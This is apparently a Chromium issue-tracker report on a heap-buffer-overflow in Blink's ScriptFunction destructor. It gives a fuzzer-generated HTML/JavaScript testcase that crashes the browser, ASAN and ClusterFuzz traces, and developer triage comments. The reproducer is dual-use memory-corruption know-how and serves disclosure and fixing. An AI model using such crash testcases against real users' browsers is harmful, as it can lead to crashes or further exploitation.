# Security: heap-buffer-overflow in blink::ScriptFunction::~ScriptFunction()

| Field | Value |
|-------|-------|
| **Issue ID** | [40091503](https://issues.chromium.org/issues/40091503) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>HTML>Script |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | cl...@gmail.com |
| **Assignee** | hi...@chromium.org |
| **Created** | 2018-05-29 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The following testcase crashes the latest ASAN build of content\_shell. It requires the flag --js-flags=--expose-gc and might need a few attempts in which it is crashing on a null-ptr SEGV.

**VERSION**  

Chrome Version: asan-linux-release-561018  

Operating System: Linux 64bit

**REPRODUCTION CASE**

<script>
function start() {
o0=window.document;
o103=document.createElementNS('http://www.w3.org/2000/svg','desc');
o148=document.createElementNS('http://www.w3.org/2000/svg','script');
o169=o103.createShadowRoot();
o308=Object.create(HTMLAnchorElement);
o308.createdCallback=fun0;
o0.registerElement('x-foo0', {prototype: o308});
o370=function() {let x=document.documentElement.querySelectorAll('\\*:not([id])');return x[x.length-1]}();
o378=document.createElement('x-foo0');
o507=document.createElementNS('http://www.w3.org/1999/xhtml','a');
o507.appendChild(o103);
setTimeout(fun1,240);
o535=o169['prepend'](NaN,undefined,14680074,10,o370,25165824);
o544=document.createElementNS('http://www.w3.org/1999/xhtml','audio');
o0.documentElement.appendChild(o544);
o549=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');
window.top.document.body.appendChild(o549);
document.documentElement.setAttribute('begin','0.01s');
document.replaceChild(o0.documentElement,document.documentElement);
o595=window.top.frames[0];
}
function fun0() {
gc();
o471=document.createElementNS('http://www.w3.org/1999/xhtml','frameset');
o0.write('</html>');
o389=document.createElementNS('http://www.w3.org/1999/xhtml','style');
o370.appendChild(o389);
}
function fun1() {
o471.onerror=fun2;
window.top.document.documentElement.appendChild(o148);
o807=o148.append(undefined,o507,undefined);
}
function fun2() {
o849=document.createTextNode('');
o389.appendChild(o849);
location.reload();
}
</script>
<body onload="start()"></body>
# **FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION** Type of crash: tab Crash State:

==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x604000072c09 at pc 0x000009e908e4 bp 0x7ffef81139f0 sp 0x7ffef81139e8  

READ of size 4 at 0x604000072c09 thread T0 (content\_shell)  

#0 0x9e908e3 in Release ./../../base/memory/ref\_counted.h:70:5  

#1 0x9e908e3 in Release ./../../base/memory/ref\_counted.h:317:0  

#2 0x9e908e3 in Release ./../../base/memory/scoped\_refptr.h:280:0  

#3 0x9e908e3 in ~scoped\_refptr ./../../base/memory/scoped\_refptr.h:208:0  

#4 0x9e908e3 in blink::ScriptFunction::~ScriptFunction() ./../../third\_party/blink/renderer/bindings/core/v8/script\_function.h:56:0  

#5 0x78e0934 in Finalize ./../../third\_party/blink/renderer/platform/heap/heap\_page.cc:103:5  

#6 0x78e0934 in blink::NormalPage::Sweep() ./../../third\_party/blink/renderer/platform/heap/heap\_page.cc:1370:0  

#7 0x78d8dfd in SweepUnsweptPage ./../../third\_party/blink/renderer/platform/heap/heap\_page.cc:290:11  

#8 0x78d8dfd in blink::BaseArena::CompleteSweep() ./../../third\_party/blink/renderer/platform/heap/heap\_page.cc:345:0  

#9 0x78c0902 in blink::ThreadHeap::CompleteSweep() ./../../third\_party/blink/renderer/platform/heap/heap.cc:538:17  

#10 0x78eeaa1 in blink::ThreadState::CompleteSweep() ./../../third\_party/blink/renderer/platform/heap/thread\_state.cc:950:12  

#11 0x78efa80 in blink::ThreadState::CollectGarbage(blink::BlinkGC::StackState, blink::BlinkGC::MarkingType, blink::BlinkGC::SweepingType, blink::BlinkGC::GCReason) ./../../third\_party/blink/renderer/platform/heap/thread\_state.cc:1401:5  

#12 0xf1c580d in blink::V8GCController::GcEpilogue(v8::Isolate\*, v8::GCType, v8::GCCallbackFlags) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_gc\_controller.cc:257:29  

#13 0x684c856 in CallGCEpilogueCallbacks ./../../v8/src/heap/heap.cc:1837:7  

#14 0x684c856 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1806:0  

#15 0x68451e2 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1391:11  

#16 0x6840eb9 in v8::internal::Heap::CollectAllGarbage(int, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1156:3  

#17 0x5d60341 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) ./../../v8/src/api-arguments-inl.h:94:3  

#18 0x5d5d4a8 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:109:36  

#19 0x5d5ac7b in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:139:5  

#13 0x7ea9f8a5a9dc (<unknown module>)  

#14 0x7ea9f8a113d4 (<unknown module>)  

#15 0x7ea9f8a0e9d4 (<unknown module>)  

#16 0x7ea9f8a06960 (<unknown module>)  

#20 0x6748c6f in Call ./../../v8/src/simulator.h:113:12  

#21 0x6748c6f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) ./../../v8/src/execution.cc:155:0  

#22 0x6748022 in CallInternal ./../../v8/src/execution.cc:191:10  

#23 0x6748022 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution.cc:202:0  

#24 0x5bf4d5f in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) ./../../v8/src/api.cc:5198:7  

#25 0xf1ad0e1 in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:598:17  

#26 0x10d808f5 in blink::V8V0CustomElementLifecycleCallbacks::Created(blink::Element\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_v0\_custom\_element\_lifecycle\_callbacks.cc:182:3  

#27 0x1199a60b in blink::V0CustomElementCallbackQueue::ProcessInElementQueue(int) ./../../third\_party/blink/renderer/core/html/custom/v0\_custom\_element\_callback\_queue.cc:60:25  

#28 0x1199667a in blink::V0CustomElementProcessingStack::ProcessElementQueueAndPop(unsigned long, unsigned long) ./../../third\_party/blink/renderer/core/html/custom/v0\_custom\_element\_processing\_stack.cc:66:39  

#29 0xf52a829 in ~CallbackDeliveryScope ./../../third\_party/blink/renderer/core/html/custom/v0\_custom\_element\_processing\_stack.h:55:9  

#30 0xf52a829 in createElement1MethodForMainWorld ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_document.cc:3461:0  

#31 0xf52a829 in createElementMethodForMainWorld ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_document.cc:4455:0  

#32 0xf52a829 in blink::V8Document::createElementMethodCallbackForMainWorld(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_document.cc:7062:0  

#33 0x5d60341 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) ./../../v8/src/api-arguments-inl.h:94:3  

#34 0x5d5d4a8 in v8::internal::MaybeHandle[v8::internal::Object](javascript:void(0);) v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::HeapObject](javascript:void(0);), v8::internal::Handle[v8::internal::FunctionTemplateInfo](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:109:36  

#35 0x5d5ac7b in v8::internal::Builtin\_Impl\_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate\*) ./../../v8/src/builtins/builtins-api.cc:139:5  

#28 0x7ea9f8a5a9dc (<unknown module>)  

#29 0x7ea9f8a113d4 (<unknown module>)  

#30 0x7ea9f8a113d4 (<unknown module>)  

#31 0x7ea9f8a0e9d4 (<unknown module>)  

#32 0x7ea9f8a06960 (<unknown module>)  

#36 0x6748c6f in Call ./../../v8/src/simulator.h:113:12  

#37 0x6748c6f in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate\*, bool, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) ./../../v8/src/execution.cc:155:0  

#38 0x6748022 in CallInternal ./../../v8/src/execution.cc:191:10  

#39 0x6748022 in v8::internal::Execution::Call(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) ./../../v8/src/execution.cc:202:0  

#40 0x5bf4d5f in v8::Function::Call(v8::Local[v8::Context](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*) ./../../v8/src/api.cc:5198:7  

#41 0xf1ad0e1 in blink::V8ScriptRunner::CallFunction(v8::Local[v8::Function](javascript:void(0);), blink::ExecutionContext\*, v8::Local[v8::Value](javascript:void(0);), int, v8::Local[v8::Value](javascript:void(0);)\*, v8::Isolate\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_script\_runner.cc:598:17  

#42 0x10e8dfa7 in blink::V8LazyEventListener::CallListenerFunction(blink::ScriptState\*, v8::Local[v8::Value](javascript:void(0);), blink::Event\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_lazy\_event\_listener.cc:114:8  

#43 0xf1c0c7f in blink::V8AbstractEventListener::InvokeEventHandler(blink::ScriptState\*, blink::Event\*, v8::Local[v8::Value](javascript:void(0);)) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_abstract\_event\_listener.cc:155:20  

#44 0xf1c04fb in blink::V8AbstractEventListener::HandleEvent(blink::ScriptState\*, blink::Event\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_abstract\_event\_listener.cc:104:3  

#45 0xf1c006b in blink::V8AbstractEventListener::handleEvent(blink::ExecutionContext\*, blink::Event\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_abstract\_event\_listener.cc:92:3  

#46 0x10e893be in blink::EventTarget::FireEventListeners(blink::Event\*, blink::EventTargetData\*, blink::HeapVector<blink::RegisteredEventListener, 1ul>&) ./../../third\_party/blink/renderer/core/dom/events/event\_target.cc:809:15  

#47 0x10e86d84 in blink::EventTarget::FireEventListeners(blink::Event\*) ./../../third\_party/blink/renderer/core/dom/events/event\_target.cc:660:29  

#48 0x116671ce in blink::LocalDOMWindow::DispatchEvent(blink::Event\*, blink::EventTarget\*) ./../../third\_party/blink/renderer/core/frame/local\_dom\_window.cc:1504:10  

#49 0x116662f2 in blink::LocalDOMWindow::DispatchLoadEvent() ./../../third\_party/blink/renderer/core/frame/local\_dom\_window.cc:1457:5  

#50 0x11665c43 in blink::LocalDOMWindow::DispatchWindowLoadEvent() ./../../third\_party/blink/renderer/core/frame/local\_dom\_window.cc:382:3  

#51 0x1166683a in blink::LocalDOMWindow::DocumentWasClosed() ./../../third\_party/blink/renderer/core/frame/local\_dom\_window.cc:386:3  

#52 0x10cd47d2 in blink::Document::ImplicitClose() ./../../third\_party/blink/renderer/core/dom/document.cc:3258:18  

#53 0x10cd3f69 in blink::Document::CheckCompleted() ./../../third\_party/blink/renderer/core/dom/document.cc:3350:5  

#54 0x12befc95 in blink::FrameLoader::FinishedParsing() ./../../third\_party/blink/renderer/core/loader/frame\_loader.cc:437:26  

#55 0x10cff84e in blink::Document::FinishedParsing() ./../../third\_party/blink/renderer/core/dom/document.cc:5829:21  

#56 0x119c5ce3 in end ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:895:18  

#57 0x119c5ce3 in blink::HTMLDocumentParser::AttemptToRunDeferredScriptsAndEnd() ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:910:0  

#58 0x119ccbe5 in blink::HTMLDocumentParser::ProcessTokenizedChunkFromBackgroundParser(std::\_\_1::unique\_ptr<blink::HTMLDocumentParser::TokenizedChunk, std::\_\_1::default\_delete[blink::HTMLDocumentParser::TokenizedChunk](javascript:void(0);) >) ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:0:9  

#59 0x119c7813 in blink::HTMLDocumentParser::PumpPendingSpeculations() ./../../third\_party/blink/renderer/core/html/parser/html\_document\_parser.cc:596:9  

#60 0x10070ddc in Run ./../../base/callback.h:96:12  

#61 0x10070ddc in blink::TaskHandle::Runner::Run(blink::TaskHandle const&) ./../../third\_party/blink/renderer/platform/web\_task\_runner.cc:75:0  

#62 0xa3688b9 in Run ./../../base/callback.h:96:12  

#63 0xa3688b9 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0  

#64 0x7aa030a in base::sequence\_manager::internal::ThreadControllerImpl::DoWork(base::sequence\_manager::internal::ThreadControllerImpl::WorkType) ./../../third\_party/blink/renderer/platform/scheduler/base/thread\_controller\_impl.cc:170:21  

#65 0xa3688b9 in Run ./../../base/callback.h:96:12  

#66 0xa3688b9 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask\*) ./../../base/debug/task\_annotator.cc:101:0  

#67 0xa3d76d9 in base::MessageLoop::RunTask(base::PendingTask\*) ./../../base/message\_loop/message\_loop.cc:319:25  

#68 0xa3d8b9f in DeferOrRunPendingTask ./../../base/message\_loop/message\_loop.cc:329:5  

#69 0xa3d8b9f in base::MessageLoop::DoWork() ./../../base/message\_loop/message\_loop.cc:373:0  

#70 0xa3e266f in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ./../../base/message\_loop/message\_pump\_default.cc:37:31  

#71 0xa44b7ab in base::RunLoop::Run() ./../../base/run\_loop.cc:102:14  

#72 0x16e3e7e3 in content::RendererMain(content::MainFunctionParams const&) ./../../content/renderer/renderer\_main.cc:245:23  

#73 0x7efba51 in content::RunZygote(content::ContentMainDelegate\*) ./../../content/app/content\_main\_runner\_impl.cc:567:14  

#74 0x7f000d2 in content::ContentMainRunnerImpl::Run() ./../../content/app/content\_main\_runner\_impl.cc:969:10  

#75 0xefdeddc in service\_manager::Main(service\_manager::MainParams const&) ./../../services/service\_manager/embedder/main.cc:459:29  

#76 0x586df87 in content::ContentMain(content::ContentMainParams const&) ./../../content/app/content\_main.cc:19:10  

#77 0x33f7f77 in main ./../../content/shell/app/shell\_main.cc:48:10  

#78 0x7f53018c3b96 in \_\_libc\_start\_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310:0

0x604000072c09 is located 7 bytes to the left of 40-byte region [0x604000072c10,0x604000072c38)  

allocated by thread T0 (content\_shell) here:  

#0 0x33f4f72 in operator new(unsigned long) *asan\_rtl*:3  

#1 0x698c37c in v8::internal::MemoryChunk::Initialize(v8::internal::Heap\*, unsigned long, unsigned long, unsigned long, unsigned long, v8::internal::Executability, v8::internal::Space\*, v8::internal::VirtualMemory\*) ./../../v8/src/heap/spaces.cc:623:19  

#2 0x6984737 in v8::internal::MemoryAllocator::AllocateChunk(unsigned long, unsigned long, v8::internal::Executability, v8::internal::Space\*) ./../../v8/src/heap/spaces.cc:897:7  

#3 0x6983776 in v8::internal::Page\* v8::internal::MemoryAllocator::AllocatePage<(v8::internal::MemoryAllocator::AllocationMode)0, v8::internal::PagedSpace>(unsigned long, v8::internal::PagedSpace\*, v8::internal::Executability) ./../../v8/src/heap/spaces.cc:1110:13  

#4 0x6993d6b in v8::internal::PagedSpace::Expand() ./../../v8/src/heap/spaces.cc:1635:35  

#5 0x69a304f in v8::internal::PagedSpace::RawSlowRefillLinearAllocationArea(int) ./../../v8/src/heap/spaces.cc:3118:62  

#6 0x69a2aaf in v8::internal::PagedSpace::SlowRefillLinearAllocationArea(int) ./../../v8/src/heap/spaces.cc:3065:10  

#7 0x685039a in EnsureLinearAllocationArea ./../../v8/src/heap/spaces-inl.h:287:10  

#8 0x685039a in AllocateRawUnaligned ./../../v8/src/heap/spaces-inl.h:319:0  

#9 0x685039a in v8::internal::Heap::ReserveSpace(std::\_\_1::vector<v8::internal::Heap::Chunk, std::\_\_1::allocator[v8::internal::Heap::Chunk](javascript:void(0);) >\*, std::\_\_1::vector<unsigned long, std::\_\_1::allocator<unsigned long> >\*) ./../../v8/src/heap/heap.cc:1602:0  

#10 0x730e660 in v8::internal::DefaultDeserializerAllocator::ReserveSpace() ./../../v8/src/snapshot/default-deserializer-allocator.cc:143:27  

#11 0x732ddd4 in v8::internal::PartialDeserializer::Deserialize(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::JSGlobalProxy](javascript:void(0);), v8::DeserializeInternalFieldsCallback) ./../../v8/src/snapshot/partial-deserializer.cc:33:21  

#12 0x732dc51 in v8::internal::PartialDeserializer::DeserializeContext(v8::internal::Isolate\*, v8::internal::SnapshotData const\*, bool, v8::internal::Handle[v8::internal::JSGlobalProxy](javascript:void(0);), v8::DeserializeInternalFieldsCallback) ./../../v8/src/snapshot/partial-deserializer.cc:22:9  

#13 0x734f728 in v8::internal::Snapshot::NewContextFromSnapshot(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::JSGlobalProxy](javascript:void(0);), unsigned long, v8::DeserializeInternalFieldsCallback) ./../../v8/src/snapshot/snapshot-common.cc:76:39  

#14 0x5d55b31 in v8::internal::Genesis::Genesis(v8::internal::Isolate\*, v8::internal::MaybeHandle[v8::internal::JSGlobalProxy](javascript:void(0);), v8::Local[v8::ObjectTemplate](javascript:void(0);), unsigned long, v8::DeserializeInternalFieldsCallback, v8::internal::GlobalContextType) ./../../v8/src/bootstrapper.cc:5452:8  

#15 0x5d00952 in v8::internal::Bootstrapper::CreateEnvironment(v8::internal::MaybeHandle[v8::internal::JSGlobalProxy](javascript:void(0);), v8::Local[v8::ObjectTemplate](javascript:void(0);), v8::ExtensionConfiguration\*, unsigned long, v8::DeserializeInternalFieldsCallback, v8::internal::GlobalContextType) ./../../v8/src/bootstrapper.cc:317:13  

#16 0x5bfcabe in Invoke ./../../v8/src/api.cc:6119:37  

#17 0x5bfcabe in CreateEnvironment[v8::internal::Context](javascript:void(0);) ./../../v8/src/api.cc:6216:0  

#18 0x5bfcabe in v8::NewContext(v8::Isolate\*, v8::ExtensionConfiguration\*, v8::MaybeLocal[v8::ObjectTemplate](javascript:void(0);), v8::MaybeLocal[v8::Value](javascript:void(0);), unsigned long, v8::DeserializeInternalFieldsCallback) ./../../v8/src/api.cc:6252:0  

#19 0x5bfee1d in v8::Context::FromSnapshot(v8::Isolate\*, unsigned long, v8::DeserializeInternalFieldsCallback, v8::ExtensionConfiguration\*, v8::MaybeLocal[v8::Value](javascript:void(0);)) ./../../v8/src/api.cc:6281:10  

#20 0xf1e7dde in blink::V8ContextSnapshot::CreateContextFromSnapshot(v8::Isolate\*, blink::DOMWrapperWorld const&, v8::ExtensionConfiguration\*, v8::Local[v8::Object](javascript:void(0);), blink::Document\*) ./../../third\_party/blink/renderer/bindings/core/v8/v8\_context\_snapshot.cc:136:7  

#21 0xf2073cf in blink::LocalWindowProxy::CreateContext() ./../../third\_party/blink/renderer/bindings/core/v8/local\_window\_proxy.cc:219:15  

#22 0xf204b3d in blink::LocalWindowProxy::Initialize() ./../../third\_party/blink/renderer/bindings/core/v8/local\_window\_proxy.cc:139:3  

#23 0xf1f107f in blink::WindowProxy::InitializeIfNeeded() ./../../third\_party/blink/renderer/bindings/core/v8/window\_proxy.cc:155:5  

#24 0x11649292 in GetWindowProxy ./../../third\_party/blink/renderer/bindings/core/v8/window\_proxy\_manager.h:48:19  

#25 0x11649292 in blink::Frame::GetWindowProxy(blink::DOMWrapperWorld&) ./../../third\_party/blink/renderer/core/frame/frame.cc:164:0  

#26 0xf1933f8 in blink::ToV8(blink::DOMWindow\*, v8::Local[v8::Object](javascript:void(0);), v8::Isolate\*) ./../../third\_party/blink/renderer/bindings/core/v8/to\_v8\_for\_core.cc:37:17  

#27 0xf616cb4 in V8SetReturnValueFast<v8::PropertyCallbackInfo[v8::Value](javascript:void(0);) > ./../../third\_party/blink/renderer/bindings/core/v8/v8\_binding\_for\_core.h:148:35  

#28 0xf616cb4 in indexedPropertyGetter ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_window.cc:6169:0  

#29 0xf616cb4 in blink::V8Window::indexedPropertyGetterCallback(unsigned int, v8::PropertyCallbackInfo[v8::Value](javascript:void(0);) const&) ./gen/third\_party/blink/renderer/bindings/core/v8/v8\_window.cc:10989:0  

#30 0x6a1866a in v8::internal::PropertyCallbackArguments::BasicCallIndexedGetterCallback(void (\*)(unsigned int, v8::PropertyCallbackInfo[v8::Value](javascript:void(0);) const&), unsigned int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)) ./../../v8/src/api-arguments-inl.h:254:3  

#31 0x6c3e099 in CallIndexedGetter ./../../v8/src/api-arguments-inl.h:234:10  

#32 0x6c3e099 in v8::internal::(anonymous namespace)::GetPropertyWithInterceptorInternal(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::InterceptorInfo](javascript:void(0);), bool\*) ./../../v8/src/objects.cc:1749:0  

#33 0x6c307dc in GetPropertyWithInterceptor ./../../v8/src/objects.cc:15786:10  

#34 0x6c307dc in v8::internal::Object::GetProperty(v8::internal::LookupIterator\*) ./../../v8/src/objects.cc:1024:0  

#35 0x71a2fe3 in v8::internal::Runtime::GetObjectProperty(v8::internal::Isolate\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), bool\*) ./../../v8/src/runtime/runtime-object.cc:39:32  

#36 0x69e566b in v8::internal::KeyedLoadIC::Load(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);)) ./../../v8/src/ic/ic.cc:1272:3  

#37 0x69fcfce in \_\_RT\_impl\_Runtime\_KeyedLoadIC\_Miss ./../../v8/src/ic/ic.cc:2277:3  

#38 0x69fcfce in v8::internal::Runtime\_KeyedLoadIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) ./../../v8/src/ic/ic.cc:2266:0  

#29 0x7ea9f8a5a9dc (<unknown module>)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/nils/fuzzer3/dl/asan-linux-release-561018/content\_shell+0x9e908e3)  

Shadow bytes around the buggy address:  

0x0c0880006530: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fa  

0x0c0880006540: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa  

0x0c0880006550: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa  

0x0c0880006560: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fa  

0x0c0880006570: fa fa fd fd fd fd fd fd fa fa 00 00 00 00 00 fa  

=>0x0c0880006580: fa[fa]00 00 00 00 00 fa fa fa 00 00 00 00 00 00  

0x0c0880006590: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fd  

0x0c08800065a0: fa fa 00 00 00 00 00 01 fa fa fd fd fd fd fd fd  

0x0c08800065b0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd  

0x0c08800065c0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd  

0x0c08800065d0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fd  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==1==ABORTING

## Timeline

### cl...@chromium.org (2018-05-30)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6010833512169472.

### cl...@chromium.org (2018-05-31)

Detailed report: https://clusterfuzz.com/testcase?key=6010833512169472

Job Type: linux_asan_content_shell
Platform Id: linux

Crash Type: Null-dereference WRITE
Crash Address: 0x000000000028
Crash State:
  blink::StyleEngine::MarkTreeScopeDirty
  blink::StyleEngine::RemovePendingSheet
  blink::StyleElement::SheetLoaded
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell&range=523933:523937

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6010833512169472

See https://github.com/google/clusterfuzz-tools for more information.

### cl...@chromium.org (2018-05-31)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>CSS]

### me...@chromium.org (2018-06-01)

Clusterfuzz stack seems unrelated and I don't see any obvious CLs in the regression range.

hiroshige: Can you please take a look and reassign if necessary? Thanks.

[Monorail components: Blink>HTML>Script]

### me...@chromium.org (2018-06-01)

[Empty comment from Monorail migration]

### me...@chromium.org (2018-06-01)

[Empty comment from Monorail migration]

### hi...@chromium.org (2018-06-01)

Hmm, the crash stack trace reported in https://crbug.com/chromium/847570#c0 and that by clusterfuzz in https://crbug.com/chromium/847570#c2 are quite different.
In https://crbug.com/chromium/847570#c0, it seems use-after-free related to ScriptState.
In https://crbug.com/chromium/847570#c2, it seems TreeScopeStyleSheetCollection is null in StyleEngine::MarkTreeScopeDirty.

### hi...@chromium.org (2018-06-01)

As for the crash in https://crbug.com/chromium/847570#c2,
https://codereview.chromium.org/2884993002 seems related.
Removing Blink>HTML>Script as this seems a CSS issue.

As for the crash in https://crbug.com/chromium/847570#c0, I couldn't reproduce it so far.
(Always crashes due to the crash in https://crbug.com/chromium/847570#c2, and didn't see any heap-buffer-overflow crashes).


[Monorail components: -Blink>HTML>Script]

### sh...@chromium.org (2018-06-02)

[Empty comment from Monorail migration]

### cl...@gmail.com (2018-06-04)

I have also seen it crashing with the following assertion:

[24296:24296:0604/082213.455774:FATAL:heap_page.h(898)] Check failed: IsValid().
    #0 0x558724772c31 in __interceptor_backtrace /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:3980:13
    #1 0x55872d142fae in base::debug::StackTrace::StackTrace(unsigned long) ./../../base/debug/stack_trace_posix.cc:808:41
    #2 0x55872cf509a3 in logging::LogMessage::~LogMessage() ./../../base/logging.cc:592:29
    #3 0x55872b9de41f in blink::HeapObjectHeader::CheckHeader() const ./../../third_party/blink/renderer/platform/heap/heap_page.h:898:3
    #4 0x55872b9f57c8 in FromPayload ./../../third_party/blink/renderer/platform/heap/heap_page.h:926:11
    #5 0x55872b9f57c8 in blink::MarkingVisitor::Visit(void*, blink::TraceDescriptor) ./../../third_party/blink/renderer/platform/heap/marking_visitor.h:108:0
    #6 0x5587379d0760 in Trace<blink::MediaValues> ./../../third_party/blink/renderer/platform/heap/visitor.h:113:5
    #7 0x5587379d0760 in Trace<blink::MediaValues> ./../../third_party/blink/renderer/platform/heap/visitor.h:91:0
    #8 0x5587379d0760 in blink::MediaQueryEvaluator::Trace(blink::Visitor*) ./../../third_party/blink/renderer/core/css/media_query_evaluator.cc:86:0
    #9 0x55872b9c9f5f in blink::ThreadHeap::AdvanceMarkingStackProcessing(blink::Visitor*, double) ./../../third_party/blink/renderer/platform/heap/heap.cc:313:9
    #10 0x55872ba0efdd in MarkPhaseAdvanceMarking ./../../third_party/blink/renderer/platform/heap/thread_state.cc:1567:26
    #11 0x55872ba0efdd in blink::ThreadState::RunAtomicPause(blink::BlinkGC::StackState, blink::BlinkGC::MarkingType, blink::BlinkGC::SweepingType, blink::BlinkGC::GCReason) ./../../third_party/blink/renderer/platform/heap/thread_state.cc:1459:0
    #12 0x55872b9ffe4e in blink::ThreadState::CollectGarbage(blink::BlinkGC::StackState, blink::BlinkGC::MarkingType, blink::BlinkGC::SweepingType, blink::BlinkGC::GCReason) ./../../third_party/blink/renderer/platform/heap/thread_state.cc:1425:5
